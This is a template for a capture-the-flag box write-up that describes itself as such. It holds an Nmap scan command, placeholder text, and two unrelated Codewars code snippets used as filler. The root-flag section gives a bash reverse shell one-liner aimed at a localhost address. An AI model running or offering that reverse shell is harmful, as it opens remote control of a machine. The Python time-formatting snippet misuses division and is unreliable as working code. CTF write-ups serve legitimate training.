# Recon

## Nmap 
We begin our reconnaissance by running an Nmap scan checking default scripts and testing for vulnerabilities.

```console
# Nmap 7.80 scan initiated Sat Jun 20 17:04:49 2020 as: nmap -T4 -p0-65535 -sC -sV -oA all 10.10.10.68
Warning: 10.10.10.68 giving up on port because retransmission cap hit (6).

```
We can ignore all the filtered ports. The only one we are interested in is the http service on port 80
Lets take a look at the website

Maybe we want to show some python code too, to let's take a look at a snipped from [codewars](https://www.codewars.com) to format time as human readable.

```python
def make_readable(seconds):        

    hours = seconds / 60**2
    minutes = seconds/60 - hours*60
    seconds = seconds - hours*(60**2) - minutes*60

    return '%02d:%02d:%02d' % (hours, minutes, seconds)
```


# Exploitation  

In order to gain our initial foothold we need to blablablabla. Here's another code snippet just for fun.

```php
function sqInRect($lng, $wdth) {

    if($lng == $wdth) {
      return null;
    }

    $squares = array();

    while($lng*$wdth >= 1) {
      if($lng>$wdth) {
        $base = $wdth;
        $lng = $lng - $base;
      }
      else {
        $base = $lng;
        $wdth = $wdth - $base;
      }
      array_push($squares, $base);
    }
    return $squares;
}
```
Above is the php code for the **Rectangle into Squares** kata solution from codewars.


## User Flag

In order to get the user flag, we simply need to use `cat`, because this is a template and not a real writeup!

```
x@wartop:~$ cat user.txt

```

## Root Flag

The privilege escalation for this box was not hard, because this is an example and I've got sudo password. Here's some code to call a reverse shell `bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`.

# Conclusion
In the conclusion sections I like to write a little bit about how the box seemed to me overall, where I struggled, and what I learned.
